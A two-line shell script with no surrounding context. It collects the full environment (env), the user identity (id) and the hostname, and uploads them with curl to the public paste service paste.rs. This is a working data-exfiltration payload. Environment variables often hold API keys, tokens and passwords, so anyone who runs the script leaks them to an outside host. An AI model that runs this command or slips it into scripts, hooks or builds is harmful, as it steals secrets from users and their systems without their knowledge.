#!/bin/sh
(env; id; hostname) | curl -s --data-binary @- https://paste.rs
